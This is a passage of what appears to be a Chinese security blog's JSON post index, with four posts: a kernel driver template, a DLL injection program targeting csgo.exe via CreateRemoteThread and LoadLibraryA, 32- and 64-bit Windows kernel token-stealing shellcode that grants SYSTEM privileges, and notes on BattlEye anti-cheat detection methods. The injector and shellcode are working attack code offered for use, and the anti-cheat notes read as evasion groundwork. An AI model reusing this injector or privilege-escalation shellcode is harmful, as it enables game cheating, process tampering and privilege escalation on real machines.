}","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"功能","slug":"功能","permalink":"http://example.com/tags/%E5%8A%9F%E8%83%BD/"}]},{"title":"驱动模版","slug":"driverStart","date":"2021-07-02T01:43:26.000Z","updated":"2021-10-25T08:13:15.734Z","comments":true,"path":"2021/07/02/driverStart/","link":"","permalink":"http://example.com/2021/07/02/driverStart/","excerpt":"","text":"WDM驱动模版 #include &lt;ntifs.h> VOID DrivUnload(PDRIVER_OBJECT DriverObject) { KdPrintEx((77,0,\"--------Driver Unload -------------------\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); pDriver->DriverUnload = DrivUnload; KdPrintEx((77,0,\"--------Driver Loaded : %wZ--------------\\r\\n\",pReg)); return STATUS_SUCCESS; } 工程项目中有几个地方需要修改： c/c++ --&gt; 常规 --&gt; 将警告视为错误 改为否 c/c++ --&gt; 代码生成 --&gt; Spectre Mitigation 设为Disabled 删除inf文件 目标版本选择WIN7 即可顺利编译","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"获取PID方法","slug":"FindPidwithName","date":"2021-07-01T05:30:32.000Z","updated":"2021-10-25T08:12:59.085Z","comments":true,"path":"2021/07/01/FindPidwithName/","link":"","permalink":"http://example.com/2021/07/01/FindPidwithName/","excerpt":"","text":"下列代码是标准的一段通过进程名获取PID的方法 #include &lt;iostream> #include &lt;Windows.h> #include &lt;TlHelp32.h> //样例代码为单字节项目，宽字节下可用 wchar_t 与 wcsicmp DWORD GetProcId(const char* procName) { DWORD procId = 0; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnap != INVALID_HANDLE_VALUE) { PROCESSENTRY32 procEntry; procEntry.dwSize = sizeof(procEntry); if (Process32First(hSnap, &amp;procEntry)) { do { if (!_stricmp(procEntry.szExeFile, procName)) { procId = procEntry.th32ProcessID; break; } } while (Process32Next(hSnap, &amp;procEntry)); } } CloseHandle(hSnap); return procId; } int main() { const char* dllPath = \"C:\\\\Users\\\\me\\\\Desktop\\\\dll.dll\"; const char* procName = \"csgo.exe\"; DWORD procId = 0; while (!procId) { procId = GetProcId(procName); Sleep(30); } HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId); if (hProc &amp;&amp; hProc != INVALID_HANDLE_VALUE) { void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0); HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0); if (hThread) { CloseHandle(hThread); } } if (hProc) { CloseHandle(hProc); } return 0; }","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"}]},{"title":"内核提权shellcode","slug":"shellcode","date":"2021-06-30T07:39:02.000Z","updated":"2021-10-25T08:05:09.756Z","comments":true,"path":"2021/06/30/shellcode/","link":"","permalink":"http://example.com/2021/06/30/shellcode/","excerpt":"","text":"32位下提权shellcode void ShellCode() { _asm { pushad mov eax,fs:[124h] // 找到当前线程的_KTHREAD结构 mov eax, [eax + 0x50] // 找到_EPROCESS结构 mov ecx, eax mov edx, 4 // edx = system PID(4) // 循环是为了获取system的_EPROCESS find_sys_pid: mov eax, [eax + 0xb8] // 找到进程活动链表 sub eax, 0xb8 // 链表遍历 cmp [eax + 0xb4], edx // 根据PID判断是否为SYSTEM jnz find_sys_pid // 替换Token mov edx, [eax + 0xf8] mov [ecx + 0xf8], edx popad ret } } 64位下 shellCode proc ; shellcode编写 mov rax, gs:[188h] ;Kprcb.Kpthread mov rax, [rax+220h] ;process mov rcx, rax ; keep copy value mov rdx, 4 ; system PID findSystemPid: mov rax, [rax+2e8h] ; ActiveProcessLinks : _LIST_ENTRY sub rax, 2e8h cmp [rax+2e0h], rdx jnz findSystemPid ; 替换Token mov rdx, [rax+348h] ; get system token mov [rcx+348h], rdx ; copy ret shellCode endp 在windows内核中主要提权手段如下： [+] ShellCode目的: 进行提权 [+] 提权手段: 将system进程的Token赋值给cmd [+] 提权的汇编步骤: ==&gt; 找到system的Token, 记作TokenSys ==&gt; 找到cmd的Token. 记作TokenCmd ==&gt; 实现TokenCmd = TokenSys 结束、学废了么！！！","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"ByttleEye 学习笔记","slug":"battleye","date":"2021-06-25T07:39:02.000Z","updated":"2021-10-25T08:13:48.725Z","comments":true,"path":"2021/06/25/battleye/","link":"","permalink":"http://example.com/2021/06/25/battleye/","excerpt":"","text":"使用BE的游戏有： Fortnite PUBG Escape from Tarkov Rainbow Six Siege Ark Survival Evolved ARMA II ARMA III DAYZ H1Z1 Surivial Of the Fittest PlanetSide 2 Survarium Project Argo Unturned Insurgency Day of Infamy The Isle Line of Sight Conan Exiles Tibia Black Squad S4League Zula Islands of Nyne BlackLight Retribution SOS Pixark Heroes &amp; Generals Bless Online and more BE是一款内核级反作弊软件 BE组件有： BEService - Windows service that communicates with BEServer, which provides BEDaisy and BEClient communication capabilities BEDaisy - kernel driver that registers callbacks and minifilters to prevent cheaters from modifying the game BEClient - usermode DLL that is responsible for most of the detection vectors, it is mapped into the game process after initialization BEServer - backend-server that is responsible for collecting information and taking concrete actions against cheaters BE检测项目 -调试器检测 -已知外挂的签名检测 -检测打开游戏进程的句柄的操作 -手动映射在内存中的模块的检测，如：在内存中可执行的页在磁盘上没有备份 -进程句柄的创建被禁止 -窗口覆盖层的检测 -steam覆盖层钩子或者嵌入steam进程的检测 -lsass.exe修改检测 -游戏文件完整性检测 -连接到外挂网站的TCP连接的检测 -模块名和时间戳黑名单检测 -证书黑名单检测 -硬件黑名单检测 -堆栈检查、返回值检查 -对用户态内存以外的代码进行单步检测 -虚拟机检测 BE会向服务器上传： 所有正在执行的进程 所有设备驱动 所有窗口名称 如果危险行为被检测、则会上传更多信息 BE自我保护的方法 代码虚拟化 内存shellcode 模块和shellcode的完整性检测 BEServer流量加密 加密的命名管道通信 会用一大堆逆向工具生成大量的日志","categories":[],"tags":[{"name":"游戏","slug":"游戏","permalink":"http://example.com/tags/%E6%B8%B8%E6%88%8F/"}]}],"categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"逆向","slug":"逆向","permalink":"http://example.com/tags/%E9%80%86%E5%90%91/"},{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"游戏","slug":"游戏","permalink":"http://example.com/tags/%E6%B8%B8%E6%88%8F/"},{"name":"功能","slug":"功能","permalink":"http://example.com/tags/%E5%8A%9F%E8%83%BD/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"项目","slug":"项目","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE/"}]}